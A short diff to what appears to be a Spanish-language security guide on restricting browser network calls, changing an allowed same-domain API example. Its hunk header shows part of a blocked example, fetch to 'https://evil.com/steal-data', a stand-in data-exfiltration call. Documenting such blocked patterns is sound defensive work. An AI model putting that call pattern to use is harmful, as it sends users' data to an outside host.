@@ -252,7 +252,7 @@ fetch('https://evil.com/steal-data', {
 **Permite:**
 ```javascript
 // ✅ Permitido: llamar API del mismo dominio
-fetch('/api/v1/orders', {
+fetch('/api/v1/public/orders', {
   headers: { 'Authorization': `Bearer ${token}` },
 });
 ```
